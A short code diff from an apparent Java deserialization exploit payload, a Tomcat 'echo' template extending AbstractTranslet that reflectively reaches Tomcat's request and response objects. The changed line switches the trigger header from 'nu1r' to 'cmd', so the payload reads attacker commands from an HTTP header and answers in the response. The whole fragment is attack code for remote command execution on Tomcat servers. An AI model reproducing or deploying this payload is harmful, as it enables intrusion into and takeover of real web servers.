@@ -57,7 +57,7 @@ public class TomcatEchoTemplate extends AbstractTranslet {
                         f.setAccessible(true);
                         Object req  = f.get(processor);
                         Object resp = req.getClass().getMethod("getResponse", new Class[0]).invoke(req);
-                        str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"nu1r"});
+                        str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
                         if (str != null && !str.isEmpty()) {
                             resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Integer(200));
 
